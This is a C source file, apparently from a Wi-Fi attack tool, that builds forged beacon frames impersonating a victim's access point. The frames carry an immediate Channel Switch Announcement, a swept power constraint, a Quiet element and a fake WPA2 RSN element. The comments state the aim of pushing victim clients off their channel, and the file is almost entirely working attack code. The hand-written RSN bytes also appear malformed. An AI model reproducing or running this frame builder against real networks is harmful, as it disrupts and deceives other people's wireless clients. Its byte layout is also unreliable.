#include "pk_frame.h"
#include <string.h>

/* TSF and sequence control are static so the builder advances the clock by
 * one beacon interval per call - the device never actually time-synchronises
 * to anything, but a beacon whose TSF stands still looks wrong to a scanner
 * and is trivially fingerprintable. */
static uint32_t s_tsf;
static uint16_t s_seq;

void pk_frame_seed(uint32_t seed) {
    s_tsf = seed ? seed : 0x10000000u;
    s_seq = 0;
}

/* The CSA has to name a channel OTHER than the one the victim is on, or the
 * switch is a no-op. Any different channel works; the survey picks a
 * genuinely empty one (see svc_deauth.c's PK_CSA_CHANNEL). */
int pk_csa_target_channel(int channel) {
    return (channel == 13) ? 1 : 13;
}

int pk_build_tpc_beacon(uint8_t *f, const uint8_t bssid[6], const char *ssid,
                        int channel, int tick, int csa_ch) {
    if (!f || !bssid || !ssid || channel < 1 || channel > 14) {
        return -1;
    }
    int sl = 0;
    while (ssid[sl] && sl < 32) {
        sl++;
    }

    /* A survey result is only usable if it names a channel we can actually
     * name here. Anything else falls back to the builder's own choice - a
     * switch to the victim's current channel would be a no-op. */
    int csa = (csa_ch >= 1 && csa_ch <= 14 && csa_ch != channel)
                  ? csa_ch
                  : pk_csa_target_channel(channel);

    if (s_tsf == 0) {
        s_tsf = 0x10000000u;
    }
    s_tsf += 100 * 1024; /* +100 TU, matching the advertised beacon interval */
    s_seq++;

    int o = 0;
    f[o++] = 0x80;              /* beacon */
    f[o++] = 0x00;
    f[o++] = 0x00;              /* duration 0 */
    f[o++] = 0x00;
    memset(f + o, 0xff, 6); o += 6;   /* addr1 broadcast */
    memcpy(f + o, bssid, 6);    o += 6;
    memcpy(f + o, bssid, 6);    o += 6;
    f[o++] = (uint8_t)(s_seq >> 4);
    f[o++] = (uint8_t)((s_seq & 0xf) << 4);
    for (int i = 0; i < 4; i++) {       /* TSF low 4 bytes */
        f[o++] = (uint8_t)(s_tsf >> (8 * i));
    }
    for (int i = 0; i < 4; i++) {       /* TSF high 4, always 0 here */
        f[o++] = 0x00;
    }
    f[o++] = 0x64;              /* beacon interval 100 TU */
    f[o++] = 0x00;
    f[o++] = 0x05;              /* capability: spectrum mgmt + preamble */
    f[o++] = 0x01;

    f[o++] = 0x00;              /* SSID */
    f[o++] = (uint8_t)sl;
    memcpy(f + o, ssid, (size_t)sl);
    o += sl;

    f[o++] = 0x01;              /* Supported Rates */
    f[o++] = 0x04;
    f[o++] = 0x82; f[o++] = 0x84; f[o++] = 0x8B; f[o++] = 0x96;

    f[o++] = 0x03;              /* DS Parameter */
    f[o++] = 0x01;
    f[o++] = (uint8_t)channel;

    /* TPC is only legal alongside a Country element - without this the
     * Power Constraint below is ignored by most stacks. */
    f[o++] = 0x07;              /* Country */
    f[o++] = 0x06;
    f[o++] = 'U'; f[o++] = 'S'; f[o++] = ' ';
    f[o++] = 1;                 /* first channel */
    f[o++] = 11;                /* last channel */
    f[o++] = 30;                /* max TX power, dBm */

    /* Sweep the constraint: stacks that clamp the standard 30 get another
     * value. The reference author's own note is "you can try 35". */
    static const int8_t cons[3] = { 30, 35, 20 };
    f[o++] = 0x20;              /* Power Constraint */
    f[o++] = 0x01;
    f[o++] = (uint8_t)cons[((tick % 3) + 3) % 3];

    f[o++] = 0x23;              /* TPC Report */
    f[o++] = 0x02;
    f[o++] = 30;
    f[o++] = 0x00;

    f[o++] = 0x25;              /* Channel Switch Announcement */
    f[o++] = 0x03;
    f[o++] = 0x01;              /* mode 1: stop TX while switching */
    f[o++] = (uint8_t)csa;
    f[o++] = 0x00;              /* count 0: switch immediately */

    /* Quiet is a 5 GHz DFS radar-silencing mechanism. On 2.4 GHz it does
     * nothing, and it is kept only for fidelity to the reference. Remove it
     * if the frame ever gets tight for room. */
    f[o++] = 0x28;              /* Quiet */
    f[o++] = 0x06;
    f[o++] = 0x01;              /* quiet count */
    f[o++] = 0x01;              /* quiet period */
    f[o++] = 0xFF;              /* duration, 65535 ms */
    f[o++] = 0xFF;
    f[o++] = 0x00;              /* offset, TSF */
    f[o++] = 0x00;

    /* RSN so the fake AP reads as real WPA2; a scanning client may otherwise
     * discard the frame before looking at the IEs above. From Marauder. */
    f[o++] = 0x30;
    f[o++] = 0x18;
    f[o++] = 0x01; f[o++] = 0x00;
    f[o++] = 0x00; f[o++] = 0x0F; f[o++] = 0xAC; f[o++] = 0x04;
    f[o++] = 0x02; f[o++] = 0x00; f[o++] = 0x0F; f[o++] = 0xAC; f[o++] = 0x04;
    f[o++] = 0x01; f[o++] = 0x00; f[o++] = 0x00; f[o++] = 0x0F; f[o++] = 0xAC; f[o++] = 0x02;
    f[o++] = 0x04; f[o++] = 0x01; f[o++] = 0x00; f[o++] = 0x00; f[o++] = 0x0F; f[o++] = 0xAC; f[o++] = 0x02;

    return o;
}